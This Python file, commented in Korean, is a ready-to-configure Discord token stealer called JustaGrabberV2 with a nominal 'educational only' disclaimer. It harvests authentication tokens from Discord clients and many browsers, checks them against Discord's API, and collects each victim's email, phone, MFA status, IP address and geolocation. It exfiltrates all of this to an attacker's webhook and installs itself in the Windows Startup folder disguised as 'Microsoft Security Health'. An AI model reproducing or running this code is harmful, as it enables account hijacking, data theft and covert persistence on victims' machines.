""" 
     **오직 교육적 목적으로 제작된 프로그램입니다. 이용시 모든 책임은 사용자에게 있는걸 인지하고 다운로드 해야합니다**
     ██╗██╗   ██╗███████╗████████╗ █████╗  ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗     ██╗   ██╗██████╗ 
     ██║██║   ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗    ██║   ██║╚════██╗
     ██║██║   ██║███████╗   ██║   ███████║██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝    ██║   ██║ █████╔╝
██   ██║██║   ██║╚════██║   ██║   ██╔══██║██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██╔═══╝ 
╚█████╔╝╚██████╔╝███████║   ██║   ██║  ██║╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║     ╚████╔╝ ███████╗
 ╚════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚══════╝
    설명 :
    JustaGrabberV2 는 KYB Software의 프로그램입니다. 무단복제를 금지합니다.
    꼭 주석을 읽거나 설명을 읽고 하시기 바랍니다
"""
# requests 모듈이 깔려 있어야합니다. 없으면 엠베드는 보내지 않습니다

import sys
try:  
    import requests
except ModuleNotFoundError:
    sys.exit()

import os, re, json, urllib.request,datetime,random,shutil 

WEBHOOK_URL = '' # 여기에 당신에 웹훅을 붙여 넣으세요
Ping_me = True # 만약 True이면 웹훅은 토큰을 땄을때 당신을 멘션할겁니다
BlacklistedIP = ["1.1.1.1","2.2.2.2"] # 만약 실행한 사람의 아이피가 이 리스트 안에 있으면 즉시 종료하고 결과를 보내지 않습니다

# 아래 설정들은 시작프로그램 세팅입니다. Startup = False일때는 그 아래 세팅들을 안해도 됩니다.
Startup = True #만약 True이면 컴퓨터를 켤때마다 자동 시작됩니다. FileName, extension을 꼭 확인해주시기 바랍니다.
FileName = "JustaGrabberV2.py" # 파일 이름을 적어주세요. 파일 이름이 달라지면 안됩니다. JustaGrabber.py나 Grabber.exe등 꼭 해당 파일의 완성본의 이름을 적어주세요
extension = ".py" # 완성된 파일의 확장명입니다. 예) .py / .exe / .bat 등

def find_tokens(path): # 토큰찾기 
    path += '\\Local Storage\\leveldb'
    tokens = [] # Token list

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    if token.startswith("N") or token.startswith("O") or token.startswith("mfa"):
                        tokens.append(token)
    return tokens

def JustaGrabber(): #메임함수
    appdata = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    temp = os.getenv('TEMP')
    tempfolder = temp + "\\" + str(random.randint(10000000,99999999))
    os.mkdir(tempfolder) # 랜덤한 정크 폴더를 만듭니다.

    paths = { # 브라우저, 디스코드 클라이언트 폴더
        '<Discord> ': roaming + '\\Discord',
        '<LightCord> ': roaming + '\\Lightcord',
        '<Discord_Canary>' : roaming + '\\discordcanary',
        '<Discord_PTB>' : roaming + '\\discordptb',
        '<Google_Chrome>' : appdata + '\\Google\\Chrome\\User Data\\Default',
        '<Opera>' : roaming + '\\Opera Software\\Opera Stable',
        '<Opera GX>' : roaming + '\\Opera Software\\Opera GX Stable',
        '<Amigo>' : appdata + '\\Amigo\\User Data',
        '<Torch>' : appdata + '\\Torch\\User Data',
        '<Orbitum>' : appdata + '\\Orbitum\\User Data',
        '<CentBrowse>' : appdata + '\\CentBrowse\\User Data',
        '<7Star>' : appdata + '\\7Star\\7Star\\User Data',
        '<Vivaldi>' : appdata + '\\Vivaldi\\User Data\\Default',
        '<Sputnik>' : appdata + '\\Sputnik\\Sputnik\\User Data',
        '<Chrome SxS>' : appdata + '\\Google\\Chrome SxS\\User Data',
        '<Epic Privacy Browser>' : appdata + '\\Epic Privacy Browser\\User Data',
        '<Microsoft Edge>' : appdata + 'Microsoft\\Edge\\User Data\\Default',
        '<Uran>' : appdata + 'uCozMedia\\Uran\\User Data\\Default',
        '<Brave>' : appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        '<Yandex>' : appdata + '\\Yandex\\YandexBrowser\\User Data\\Default',
        '<Naver_whale>' : appdata + '\\Naver\\Naver Whale\\User Data\\Default',
        '<Naver_whale_Flash>' : appdata + '\\Naver\\Naver Whale Flash\\User Data\\Default'
    }

    def getipinfo(): # IP의 정보를 따는중
        url = "http://ipinfo.io/json"
        responce = urllib.request.urlopen(url)
        data = json.load(responce)
        ip = data['ip']
        city = data['city']
        region = data['region']
        country = data['country']
        loc = data['loc']
        org = data['org']
        postal = data['postal']
        timezone = data['timezone']
        # location is not correct.
        return ip,city,region,country,loc,org,postal,timezone
    if getipinfo()[0] in BlacklistedIP: # If ip in blacklist, exit.
        sys.exit()

    if Ping_me:
        message = "@everyone   JustaGrabberV2 found a new token! \n" # 멘션하기
    message += "```md\n"
 
    file = open(tempfolder+"/Tokeninfo.txt","w+")
    file.write("Token Info by JustaGrabberV2\n \n") # 토큰정보 파일 생성
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n{platform}\n\n'
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                headers={ 
                    'Authorization': token
                }
                src = requests.get('https://discordapp.com/api/v8/auth/login', headers=headers) # Token checker
                if src.status_code == 200:
                    message += '<Tokens_found : ' + f'{token}' + '>' + '\n'
                    headers={ 
                        'Authorization': token
                    }
                    
                    headerrs = {'Authorization': token, 'Content-Type': 'application/json'}  
                    r = requests.get('https://discord.com/api/v8/users/@me', headers=headerrs)
                    if r.status_code == 200:
                        userName = r.json()['username'] + '#' + r.json()['discriminator']
                        userID = r.json()['id']
                        phone = r.json()['phone']
                        email = r.json()['email']
                        mfa = r.json()['mfa_enabled']
                        f = r.json()['nsfw_allowed']
                        ff = r.json()['locale']
                        fff = r.json()['verified']
                        ffff = r.json()['flags']
                        fffff = r.json()['avatar']
                        reee = False
                        if 'premium_type' in r.json():
                            reee = True
                        # 토큰정보파일 쓰기 ( 아래 )
                        file.write(f"\n--------------------\nToken : {token}\nUsername : {userName}\nUser ID : {userID}\nPhone : {phone}\nEmail : {email}\nVerified : {fff}\n2 Factor login enabled : {mfa}\nNSFW allowed : {f}\nLanguage : {ff}\nFlags : {ffff}\nNitro : {reee}\nAvatar : https://cdn.discordapp.com/avatars/{userID}/{fffff}\n--------------------\n")

        else: 
            message += '[Error](No tokens found.)\n'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    message += "```"
    payload = json.dumps({'content': message}) # 메세지 보내기
    try: 
        req = urllib.request.Request(WEBHOOK_URL, data=payload.encode(), headers=headers) # 엠베드
        urllib.request.urlopen(req)
        today = datetime.date.today()
        alert = {
            "avatar_url":"https://media.discordapp.net/attachments/853578499096707082/904920147414908938/unknown.png",
            "name":"JustaGrabberV2",
            "embeds": [
                {
                    "author": {
                    "name": "JustaGrabberV2 Grabbed token!",
                    "icon_url": "https://cdn.discordapp.com/emojis/819756986223689728.gif?size=96",
                    "url": "https://github.com/fanta09tv/JustaGrabberV2"
                     },
                "description":f'Username : ' + os.getenv('USER', os.getenv('USERNAME', 'user'))+'⠀IP : ' + getipinfo()[0] + '⠀PC Name : ' + os.getenv("COMPUTERNAME") + '⠀\nCountry : ' + getipinfo()[3] + '⠀City : ' + getipinfo()[1] + '⠀Region : ' + getipinfo()[1] + '\nPostal : ' + getipinfo()[6] + '⠀Timezone : ' + getipinfo()[7] + '⠀Location : ' + getipinfo()[4] + '\nGoogle Map : ' + "https://www.google.com/maps/search/google+map++" + getipinfo()[4],
                "color": 0x00C7FF,
                "thumbnail":{
                    "url":"https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96"
                },
                "footer": {
                    "text": f"Token found on {today} / ©fanta09tv in github"
                }
            }
        ]
        } 
        requests.post(WEBHOOK_URL, json=alert)  # 엠베트 보내기
        file.close()
        requests.post(WEBHOOK_URL, files={'upload_file': open(tempfolder+"/Tokeninfo.txt")}) # 토큰정보 파일 올리기
    except:
        pass
    # 시작프로그램 ( 아래 )
    if Startup : shutil.copyfile(f'{FileName}',"C:\\Users\\" + os.getenv('USER', os.getenv('USERNAME', 'user')) + f"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Microsoft Security Health{extension}")
    
if __name__ == "__main__":
    JustaGrabber() # Starting JustaGrabberV2
